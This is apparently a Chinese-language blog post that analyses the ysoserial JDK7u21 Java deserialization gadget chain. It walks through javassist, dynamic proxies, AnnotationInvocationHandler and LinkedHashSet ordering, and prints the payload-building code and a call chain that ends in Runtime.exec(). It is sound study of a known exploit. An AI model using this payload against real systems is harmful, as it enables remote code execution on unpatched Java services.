<!DOCTYPE html>
<html>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="ysoserial是一个反序列化的payload生成工具,其集成了不同框架的payload,其中有个JDK7u21,利用条件不依赖于第三方库,只需要JRE版本满足条件。在分析Weblogic-CVE-2019-2725时也用到了这个payload,本着知其然更要知其所以然的想法,自己调试一遍记录下               JDK7u21 payload分析 总体思路:最外层使用LinkedH">
<meta name="keywords" content="工具源码分析,Ysoserial">
<meta property="og:type" content="article">
<meta property="og:title" content="Ysoserial之JDK7u21分析">
<meta property="og:url" content="https://p0rz9.github.io/2019/06/08/Ysoserial之JDK7u21分析/index.html">
<meta property="og:site_name" content="P0rZ9&#39;s blog">
<meta property="og:description" content="ysoserial是一个反序列化的payload生成工具,其集成了不同框架的payload,其中有个JDK7u21,利用条件不依赖于第三方库,只需要JRE版本满足条件。在分析Weblogic-CVE-2019-2725时也用到了这个payload,本着知其然更要知其所以然的想法,自己调试一遍记录下               JDK7u21 payload分析 总体思路:最外层使用LinkedH">
<meta property="og:locale" content="default">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-06-05.14.39.14-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-06-09.15.46.04-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-06-09.15.49.00-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-06-09.20.10.12-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-06-09.20.13.55-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-06-09.21.37.56-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-06-09.20.15.42-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-06-09.16.57.22-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-06-10.11.48.48-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-06-09.20.54.26-image.png">
<meta property="og:updated_time" content="2019-06-20T07:11:35.122Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Ysoserial之JDK7u21分析">
<meta name="twitter:description" content="ysoserial是一个反序列化的payload生成工具,其集成了不同框架的payload,其中有个JDK7u21,利用条件不依赖于第三方库,只需要JRE版本满足条件。在分析Weblogic-CVE-2019-2725时也用到了这个payload,本着知其然更要知其所以然的想法,自己调试一遍记录下               JDK7u21 payload分析 总体思路:最外层使用LinkedH">
<meta name="twitter:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-06-05.14.39.14-image.png">
    
    
        
          
              <link rel="shortcut icon" href="../../../../images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="../../../../images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="../../../../images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>Ysoserial之JDK7u21分析</title>
    <!-- styles -->
    <link rel="stylesheet" href="../../../../css/style.css">
    <!-- rss -->
    
    
</head>

<body>
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <li><a href="../../../../index.html">Home</a></li><li><a href="../../../../about.html">About</a></li><li><a href="../../../../archives/">Writing</a></li><li><a href="../../../../friends.html">Friends</a></li>
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="../../15/Ysoserial之Spring1_2/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="../../02/Fatsjson反序列化后续/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">回到顶部</span>
      <span id="i-share" class="info" style="display:none;">分享</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://p0rz9.github.io/2019/06/08/Ysoserial之JDK7u21分析/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://p0rz9.github.io/2019/06/08/Ysoserial之JDK7u21分析/&text=Ysoserial之JDK7u21分析"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://p0rz9.github.io/2019/06/08/Ysoserial之JDK7u21分析/&title=Ysoserial之JDK7u21分析"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://p0rz9.github.io/2019/06/08/Ysoserial之JDK7u21分析/&is_video=false&description=Ysoserial之JDK7u21分析"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Ysoserial之JDK7u21分析&body=Check out this article: https://p0rz9.github.io/2019/06/08/Ysoserial之JDK7u21分析/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://p0rz9.github.io/2019/06/08/Ysoserial之JDK7u21分析/&title=Ysoserial之JDK7u21分析"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://p0rz9.github.io/2019/06/08/Ysoserial之JDK7u21分析/&title=Ysoserial之JDK7u21分析"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://p0rz9.github.io/2019/06/08/Ysoserial之JDK7u21分析/&title=Ysoserial之JDK7u21分析"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://p0rz9.github.io/2019/06/08/Ysoserial之JDK7u21分析/&title=Ysoserial之JDK7u21分析"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://p0rz9.github.io/2019/06/08/Ysoserial之JDK7u21分析/&name=Ysoserial之JDK7u21分析&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#JDK7u21-payload分析"><span class="toc-number">1.</span> <span class="toc-text">JDK7u21 payload分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#javassist"><span class="toc-number">1.1.</span> <span class="toc-text">javassist</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#动态代理"><span class="toc-number">1.2.</span> <span class="toc-text">动态代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC核心类"><span class="toc-number">1.3.</span> <span class="toc-text">POC核心类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TemplatesImpl利用"><span class="toc-number">1.3.1.</span> <span class="toc-text">TemplatesImpl利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AnnotationInvocationHandler"><span class="toc-number">1.3.2.</span> <span class="toc-text">AnnotationInvocationHandler</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LinkedHashSet"><span class="toc-number">1.3.3.</span> <span class="toc-text">LinkedHashSet</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞分析"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hash绕过"><span class="toc-number">1.4.1.</span> <span class="toc-text">hash绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">1.5.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-number">1.6.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index width mx-auto px2 my4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Ysoserial之JDK7u21分析
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">P0rZ9's blog</span>
      </span>
      
    <div class="postdate">
        <time datetime="2019-06-08T00:15:41.000Z" itemprop="datePublished">2019-06-08</time>
    </div>


      
    <div class="article-tag">
        <i class="fa fa-tag"></i>
        <a class="tag-link" href="../../../../tags/工具源码分析-Ysoserial/">工具源码分析,Ysoserial</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <blockquote>
<p>ysoserial是一个反序列化的payload生成工具,其集成了不同框架的payload,其中有个JDK7u21,利用条件不依赖于第三方库,只需要JRE版本满足条件。在分析Weblogic-CVE-2019-2725时也用到了这个payload,本着<strong>知其然更要知其所以然</strong>的想法,自己调试一遍记录下            </p>
</blockquote>
<hr>
<h1 id="JDK7u21-payload分析"><a href="#JDK7u21-payload分析" class="headerlink" title="JDK7u21 payload分析"></a>JDK7u21 payload分析</h1><blockquote>
<p>总体思路:最外层使用LinkedHashSet,值分别为恶意类(templates)与代理类(proxy)。在反序列化时,调用<strong>proxy.equals(templates)</strong>,会转发到AnnotationInvocationHandler的invoke(),invoke()方法中调用指定接口类中的全部方法(getOutputProperties/newTransformer),造成恶意代码执行                            </p>
</blockquote>
<h2 id="javassist"><a href="#javassist" class="headerlink" title="javassist"></a>javassist</h2><blockquote>
<p>动态生成恶意代码。在payload中,作者通过javassist动态生成恶意类供后续使用。javassist在运行时操作字节码,可以在class文件中插入我们想执行的Java代码            </p>
</blockquote>
<p>看个例子:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Persion.java			</span><br><span class="line">public class Person &#123;</span><br><span class="line">&#125;</span><br><span class="line">public static void main() throws Exception &#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass cc = pool.get(Person.class.getName());</span><br><span class="line">        String cmd = &quot;System.out.println(\&quot;evil\&quot;);&quot;;</span><br><span class="line">        // 创建静态代码块</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        String randomClassName = &quot;EvilPersion&quot;;</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        // 写入.class 文件</span><br><span class="line">        cc.writeFile();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>EvilPersion.class：            </p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-06-05.14.39.14-image.png" alt="2019-06-05.14.39.14-image.png"></p>
<p>可看到静态代码块成功写入            </p>
<h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><blockquote>
<p>为接口指定InvocationHandler对象,那么在调用接口方法时,就会去调用指定handler的invoke()方法。    </p>
</blockquote>
<p>看个例子:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">ProxyDemo.java</span><br><span class="line">//需要实现接口</span><br><span class="line">interface Userdao&#123;</span><br><span class="line">    public void say(String str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//被代理对象</span><br><span class="line">class UserdaoImpl implements Userdao&#123;</span><br><span class="line">    public void say(String str) &#123;</span><br><span class="line">        System.out.println(&quot;UserdaoImpl.say:&quot;+str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//handler对象</span><br><span class="line">class Handler implements InvocationHandler&#123;</span><br><span class="line">    private Object proxy;</span><br><span class="line">    public Handler(Object proxy) &#123;</span><br><span class="line">        this.proxy = proxy;</span><br><span class="line">    &#125;</span><br><span class="line">    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;</span><br><span class="line">        System.out.println(&quot;before&quot;);</span><br><span class="line">        method.invoke(this.proxy,args);</span><br><span class="line">        System.out.println(&quot;after&quot;);</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public class ProxyDemo &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        UserdaoImpl user = new UserdaoImpl();</span><br><span class="line">        InvocationHandler temhandler = new Handler(user);</span><br><span class="line">        //创建代理  </span><br><span class="line">        Userdao user1 = (Userdao) Proxy.newProxyInstance(Userdao.class.getClassLoader(),new Class&lt;?&gt;[]&#123;Userdao.class&#125;,temhandler);</span><br><span class="line">        user1.say(&quot;hello&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">output:		</span><br><span class="line">before</span><br><span class="line">UserdaoImpl.say:hello</span><br><span class="line">after</span><br></pre></td></tr></table></figure></p>
<p>运行时,调用<code>user1.say(&quot;hello&quot;);</code>会去调用<code>invoke()</code>执行。在Spring中的AOP就是基于JDK动态代理实现的。            </p>
<h2 id="POC核心类"><a href="#POC核心类" class="headerlink" title="POC核心类"></a>POC核心类</h2><h3 id="TemplatesImpl利用"><a href="#TemplatesImpl利用" class="headerlink" title="TemplatesImpl利用"></a>TemplatesImpl利用</h3><p>关于利用的TemplatesImpl执行命令原理,我们在<a href="https://p0rz9.github.io/2019/05/12/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BTemplatesImpl%E8%B0%83%E7%94%A8%E9%93%BE/">Fastjson反序列化之TemplatesImpl调用链</a>已经分析过,只要最后调用<code>newTransformer()</code>或<code>getOutputProperties()</code>,即可执行命令。不过还需要找一个能够在反序列化过程中调用该方法的类            </p>
<h3 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h3><blockquote>
<p>POC中利用了AnnotationInvocationHandler的equals()来触发getOutputProperties()或newTransformer()</p>
</blockquote>
<p>其重要方法:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">构造方法:</span><br><span class="line">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">        this.type = var1;</span><br><span class="line">        this.memberValues = var2;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>实例化时传入<code>type</code>与<code>memberValues</code>的值            </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">invoke()：</span><br><span class="line">public Object invoke(Object var1, Method var2, Object[] var3) &#123;</span><br><span class="line">        String var4 = var2.getName();</span><br><span class="line">        Class[] var5 = var2.getParameterTypes();</span><br><span class="line">        if (var4.equals(&quot;equals&quot;) &amp;&amp; var5.length == 1 &amp;&amp; var5[0] == Object.class) &#123;</span><br><span class="line">            return this.equalsImpl(var3[0]);</span><br></pre></td></tr></table></figure>
<p>当调用方法为<code>equals</code>时,会调用内部方法<code>equalsImpl()</code>    </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">equalsImpl()：			</span><br><span class="line">private Boolean equalsImpl(Object var1) &#123;</span><br><span class="line">        ...</span><br><span class="line">        //var1需要为type的实例</span><br><span class="line">        else if (!this.type.isInstance(var1)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">        	//获取type class的所有方法</span><br><span class="line">            Method[] var2 = this.getMemberMethods();</span><br><span class="line">            ...</span><br><span class="line">                if (var9 != null) &#123;</span><br><span class="line">                    var8 = var9.memberValues.get(var6);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    try &#123;</span><br><span class="line">                    	//反射调用方法</span><br><span class="line">                        var8 = var5.invoke(var1);</span><br></pre></td></tr></table></figure>
<p>首先判断var1是否为type的实例,接着获取type class的所有方法,依次进行调用。所以在实例化<code>AnnotationInvocationHandler</code>时需要指定type,且<code>equals()</code>的参数为type的实现类<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HashMap map = new HashMap();		</span><br><span class="line">map.put(&quot;f5a5a608&quot;, &quot;foo&quot;);			</span><br><span class="line">Constructor&lt;?&gt; ctor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructors()[0];</span><br><span class="line">ctor.setAccessible(true);</span><br><span class="line"></span><br><span class="line">//指定type为Templates接口  memberValues为特殊map</span><br><span class="line">InvocationHandler tempHandler = (InvocationHandler) ctor.newInstance(Templates.class, map);</span><br></pre></td></tr></table></figure></p>
<h3 id="LinkedHashSet"><a href="#LinkedHashSet" class="headerlink" title="LinkedHashSet"></a>LinkedHashSet</h3><blockquote>
<p>POC中用到的LinkedHashSet是最外层的类,将恶意代码类与代理类添加到set当中。在反序列化过程中调用<strong>proxy.equals(EvilTemplate)</strong>执行命令</p>
</blockquote>
<p>特点:<br><code>LinkedHashSet</code>继承<code>HashSet</code>,基于<code>LinkHashMap</code>实现,添加到set中的元素可保持顺序。            </p>
<p>内部实现:<br><code>Hashset</code>的<code>readObject()</code>中,会调用每个对象的<code>readObject()</code>,且将元素作为key添加到<code>HashMap</code>中(value是固定的)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">private void readObject(java.io.ObjectInputStream s)</span><br><span class="line">        throws java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        ...</span><br><span class="line">        // Read in all elements in the proper order.</span><br><span class="line">        for (int i=0; i&lt;size; i++) &#123;</span><br><span class="line">            E e = (E) s.readObject();</span><br><span class="line">            map.put(e, PRESENT);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>我们跟进<strong>put()</strong> 查看:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">public V put(K key, V value) &#123;</span><br><span class="line">        if (key == null)</span><br><span class="line">            return putForNullKey(value);</span><br><span class="line">        int hash = hash(key);</span><br><span class="line">        int i = indexFor(hash, table.length);</span><br><span class="line">        for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) &#123;</span><br><span class="line">            Object k;</span><br><span class="line">            if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;</span><br><span class="line">                V oldValue = e.value;</span><br><span class="line">                e.value = value;</span><br><span class="line">                e.recordAccess(this);</span><br><span class="line">                return oldValue;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        modCount++;</span><br><span class="line">        addEntry(hash, key, value, i);</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>代码调用新插入元素的key的<code>equals()</code>与k(原来存在元素的key)比较来判断是否相等。我们需要触发的是代理类的<code>equals()</code>,所以要按顺序添加恶意类与代理类。这就是使用<code>LinkedHashSet</code>的原因(保证顺序)。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>这个漏洞的主要代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">public Object buildPayload(final String command) throws Exception &#123;</span><br><span class="line">        //创建一个恶意类Templates</span><br><span class="line">        Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">        //特殊String, f5a5a608.hashcode() = 0</span><br><span class="line">        String zeroHashCodeStr = &quot;f5a5a608&quot;;</span><br><span class="line"></span><br><span class="line">        //创建一个hash map, 将我们的恶意类放入</span><br><span class="line">        HashMap map = new HashMap();</span><br><span class="line">        map.put(zeroHashCodeStr, &quot;foo&quot;);  // Not necessary</span><br><span class="line"></span><br><span class="line">        // 创建代理使用的handler</span><br><span class="line">        // 当调用被代理对象的任何方法时,都会去调用AnnotationInvocationHandler.invoke()</span><br><span class="line">        Constructor&lt;?&gt; ctor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructors()[0];</span><br><span class="line">        ctor.setAccessible(true);</span><br><span class="line">        InvocationHandler tempHandler = (InvocationHandler) ctor.newInstance(Templates.class, map);</span><br><span class="line">//        Reflections.setFieldValue(tempHandler, &quot;type&quot;, Templates.class);  // not necessary, because newInstance() already pass Templates.class to tempHandler</span><br><span class="line">        Templates proxy = (Templates) Proxy.newProxyInstance(JDK7u21.class.getClassLoader(), templates.getClass().getInterfaces(), tempHandler);</span><br><span class="line"></span><br><span class="line">        Reflections.setFieldValue(templates, &quot;_auxClasses&quot;, null);</span><br><span class="line">        Reflections.setFieldValue(templates, &quot;_class&quot;, null);</span><br><span class="line"></span><br><span class="line">        LinkedHashSet set = new LinkedHashSet(); // maintain order</span><br><span class="line">        set.add(templates);     // 存储恶意字节码的templates类对象</span><br><span class="line">        set.add(proxy);         // 代理对象</span><br><span class="line"></span><br><span class="line">        map.put(zeroHashCodeStr, templates);</span><br><span class="line"></span><br><span class="line">        //set中存储了恶意代码,只要反序列化这个set即可触发</span><br><span class="line">        return set;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>我们跟一遍流程:<br>对得到的set进行反序列化操作时,会调用<code>LinkedHashSet</code>的<code>readObject()</code>,实质上是调用其父类<code>HashSet</code>的<code>readObject()</code></p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-06-09.15.46.04-image.png" alt="2019-06-09.15.46.04-image.png"></p>
<p>依次向map中添加<code>templates</code>与<code>proxy</code>对象,跟进<code>put()</code></p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-06-09.15.49.00-image.png" alt="2019-06-09.15.49.00-image.png"></p>
<p>这里首先计算新元素的hash,然后通过hash找见索引,之后遍历索引位置的元素,通过比较hash来判断元素是否存在,若存在,覆盖,若不存在,添加。                    </p>
<p>最关键的是376行 判断的地方,POC就是通过这里的<code>key.equals(k)</code>触发调用链导致命令执行。在添加<code>proxy</code>对象时,会调用<code>proxy.equals(EvilTemplate)</code>,接着会转发到<code>AnnotationInvocationHandler.invoke()</code>,跟进                </p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-06-09.20.10.12-image.png" alt="2019-06-09.20.10.12-image.png"></p>
<p>跟进<code>equalsImpl()</code>            </p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-06-09.20.13.55-image.png" alt="2019-06-09.20.13.55-image.png"></p>
<p>这里首先会获取type中的全部方法,再依次执行。<code>type</code>的值是实例化时传入的:        </p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-06-09.21.37.56-image.png" alt="2019-06-09.21.37.56-image.png"></p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-06-09.20.15.42-image.png" alt="2019-06-09.20.15.42-image.png"></p>
<p>通过反射执行<code>getOutputProperties()</code>时触发漏洞链,造成命令执行                                </p>
<p>作者给出的利用链：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">LinkedHashSet.readObject()</span><br><span class="line">  LinkedHashSet.add()</span><br><span class="line">    ...</span><br><span class="line">      TemplatesImpl.hashCode() (X)</span><br><span class="line">  LinkedHashSet.add()</span><br><span class="line">    ...</span><br><span class="line">      Proxy(Templates).hashCode() (X)</span><br><span class="line">        AnnotationInvocationHandler.invoke() (X)</span><br><span class="line">          AnnotationInvocationHandler.hashCodeImpl() (X)</span><br><span class="line">            String.hashCode() (0)</span><br><span class="line">            AnnotationInvocationHandler.memberValueHashCode() (X)</span><br><span class="line">              TemplatesImpl.hashCode() (X)</span><br><span class="line">      Proxy(Templates).equals()</span><br><span class="line">        AnnotationInvocationHandler.invoke()</span><br><span class="line">          AnnotationInvocationHandler.equalsImpl()</span><br><span class="line">            Method.invoke()</span><br><span class="line">              ...</span><br><span class="line">                TemplatesImpl.getOutputProperties()</span><br><span class="line">                  TemplatesImpl.newTransformer()</span><br><span class="line">                    TemplatesImpl.getTransletInstance()</span><br><span class="line">                      TemplatesImpl.defineTransletClasses()</span><br><span class="line">                        ClassLoader.defineClass()</span><br><span class="line">                        Class.newInstance()</span><br><span class="line">                          ...</span><br><span class="line">                            MaliciousClass.&lt;clinit&gt;()</span><br><span class="line">                              ...</span><br><span class="line">                                Runtime.exec()</span><br></pre></td></tr></table></figure></p>
